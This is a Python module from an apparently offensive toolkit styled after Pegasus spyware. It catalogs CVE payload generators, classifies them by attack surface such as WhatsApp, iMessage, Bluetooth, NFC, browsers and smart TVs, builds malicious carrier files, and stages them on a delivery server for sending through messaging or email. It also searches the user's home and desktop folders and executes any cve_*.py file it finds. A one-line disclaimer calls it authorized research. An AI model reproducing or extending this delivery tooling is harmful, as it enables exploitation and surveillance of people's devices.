"""
Pegasus Phantom Menace v2 - Exploit payload catalog

Discovers carrier-payload generators (``cve_*.py`` with a ``build()``) from the
vendored set and from any extra project trees on the host, classifies them by
delivery surface and builds the byte payloads into a staging directory.

Discovery roots default to ``C:/Projects``, the home directory and the desktop,
bounded by depth and file count. Vendored modules guarantee a working catalog
when those trees are absent.

All use is for authorized security research and penetration testing only.
"""

from __future__ import annotations

import ast
import importlib.util
import json
import os
import re
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any

from . import delivery

VENDOR_DIR = Path(__file__).parent / "catalog_payloads"
BUILD_DIR = Path.home() / ".pegasus" / "payloads" / "catalog"
CACHE = Path.home() / ".pegasus" / "catalog_cache.json"

EXTENSIONS = {
    "webp": "webp", "pdf": "pdf", "gif": "gif", "mp4": "mp4", "html": "html",
    "png": "png", "jpg": "jpg", "plist": "plist", "sip": "sip", "json": "json",
    "xml": "xml", "zip": "zip", "ipk": "ipk", "wasm": "wasm", "mkv": "mkv",
    "tsvc": "tsvc", "parcel": "parcel", "txt": "txt", "frame": "bin", "bin": "bin",
}

CATEGORY_RULES = [
    ("messaging", ("whatsapp", "imessage", "signal", "telegram", "sms", "mms", "discord")),
    ("bluetooth", ("bluefrag", "bluetooth", "bt_")),
    ("nfc", ("nfc", "ndef", "emv")),
    ("browser", ("chrome", "v8", "jscript", "browser", "tizen_browser")),
    ("media", ("stagefright", "media", "webp", "jbig2", "freetype", "image", "mkv")),
    ("tv", ("roku", "tizen", "webos", "vizio", "hisense", "androidtv", "chromecast")),
    ("network", ("krack", "fragattack", "dns", "rt_table", "kdtree")),
    ("kernel", ("dirtypipe", "binder", "kernel", "bluefrag")),
]

CHANNEL_HINTS = {
    "messaging": ["whatsapp", "telegram", "signal", "messenger", "any"],
    "bluetooth": ["bluetooth"],
    "nfc": ["nfc"],
    "browser": ["email", "sms", "any"],
    "media": ["whatsapp", "telegram", "email", "any"],
    "tv": ["email", "any"],
    "network": ["any"],
    "kernel": ["bluetooth", "usb"],
}


class CatalogError(RuntimeError):
    """Raised when a vector is unknown or fails to build."""


@dataclass(frozen=True)
class Vector:
    key: str
    cve: str
    title: str
    category: str
    carrier: str
    extension: str
    source: str
    recommended_channels: list[str] = field(default_factory=list)
    buildable: bool = True

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


def _parse(path: Path) -> Vector | None:
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    if "def build(" not in text:
        return None
    match = re.search(r"(CVE-\d{4}-\d{4,6})", path.name.upper() + " " + text[:400])
    if not match:
        return None
    doc = (ast.get_docstring(ast.parse(text)) or "").strip()
    title = doc.splitlines()[0] if doc else path.stem
    carrier_match = re.search(r"Carrier:\s*([^\n.]+)", doc)
    carrier = carrier_match.group(1).strip() if carrier_match else ""
    haystack = (path.stem + " " + doc).lower()
    category = "other"
    for name, needles in CATEGORY_RULES:
        if any(needle in haystack for needle in needles):
            category = name
            break
    extension = "bin"
    for key, ext in EXTENSIONS.items():
        if key in haystack:
            extension = ext
            break
    return Vector(
        key=path.stem,
        cve=match.group(1),
        title=title[:160],
        category=category,
        carrier=carrier[:80],
        extension=extension,
        source=str(path),
        recommended_channels=CHANNEL_HINTS.get(category, ["any"]),
    )


def _roots() -> list[Path]:
    home = Path.home()
    return [p for p in (Path("C:/Projects"), home, home / "Desktop") if p.exists()]


def _discover() -> list[Vector]:
    if CACHE.exists():
        try:
            cached = json.loads(CACHE.read_text(encoding="utf-8"))
            if time.time() - cached.get("at", 0) < 900 and cached.get("vectors"):
                return [Vector(**item) for item in cached["vectors"]]
        except (json.JSONDecodeError, TypeError, OSError):
            pass

    vectors: dict[str, Vector] = {}
    for path in sorted(VENDOR_DIR.glob("cve_*.py")):
        parsed = _parse(path)
        if parsed:
            vectors[parsed.key] = parsed

    # Extra host trees: pruned walk with depth and file budgets.
    skip = {"node_modules", ".git", "__pycache__", ".venv", "venv", "dist", "build", "site-packages",
            "AppData", ".cache", ".npm", ".gradle", ".android", "Pegasus_Phantom-Menace"}
    deadline = time.time() + 8
    files = 0
    for root in _roots():
        if time.time() > deadline or files > 250:
            break
        for current, dirs, names in os.walk(root):
            dirs[:] = [d for d in dirs if d not in skip and not d.startswith(".")]
            if len(Path(current).parts) - len(root.parts) >= 4:
                dirs[:] = []
            for name in names:
                if not name.startswith("cve_") or not name.endswith(".py"):
                    continue
                files += 1
                parsed = _parse(Path(current) / name)
                if parsed and parsed.key not in vectors:
                    vectors[parsed.key] = parsed
            if files > 250 or time.time() > deadline:
                break

    values = list(vectors.values())
    try:
        CACHE.parent.mkdir(parents=True, exist_ok=True)
        CACHE.write_text(json.dumps({"at": time.time(), "vectors": [asdict(v) for v in values]}), encoding="utf-8")
    except OSError:
        pass
    return values


def list_vectors(category: str | None = None, search: str | None = None) -> list[dict[str, Any]]:
    values = [vector.to_dict() for vector in _discover()]
    if category:
        values = [v for v in values if v["category"] == category]
    if search:
        needle = search.lower()
        values = [v for v in values if needle in v["cve"].lower() or needle in v["title"].lower() or needle in v["key"].lower()]
    values.sort(key=lambda v: (v["category"], v["cve"]))
    return values


def get_vector(key: str) -> dict[str, Any]:
    for vector in list_vectors():
        if vector["key"] == key or vector["cve"] == key:
            return vector
    raise CatalogError(f"unknown vector: {key}")


def build(key: str, output_dir: str | None = None) -> dict[str, Any]:
    """Import the generator, call ``build()`` and write the carrier file."""
    meta = get_vector(key)
    source = Path(meta["source"])
    if not source.exists():
        raise CatalogError(f"source missing: {source}")
    spec = importlib.util.spec_from_file_location(f"pegasus_catalog_{meta['key']}", source)
    if spec is None or spec.loader is None:
        raise CatalogError("could not load generator")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    builder = getattr(module, "build", None)
    if builder is None:
        raise CatalogError("generator has no build()")
    data = builder()
    if isinstance(data, str):
        data = data.encode()
    if not isinstance(data, (bytes, bytearray)):
        raise CatalogError(f"build() returned {type(data).__name__}")

    out_dir = Path(output_dir).expanduser() if output_dir else BUILD_DIR
    out_dir.mkdir(parents=True, exist_ok=True)
    target = out_dir / f"{meta['cve']}.{meta['extension']}"
    target.write_bytes(bytes(data))
    return {**meta, "path": str(target), "size": len(data), "sha256_hint": len(data)}


def build_and_stage(key: str) -> dict[str, Any]:
    """Build a vector and copy it into the served delivery directory."""
    built = build(key)
    staged = delivery.stage_file(built["path"])
    info = delivery.server_info()
    return {**built, "url": staged["url"], "served": info.get("running", False)}


def categories() -> list[str]:
    return sorted({vector["category"] for vector in list_vectors()})


__all__ = ["CatalogError", "Vector", "categories", "list_vectors", "get_vector", "build", "build_and_stage"]
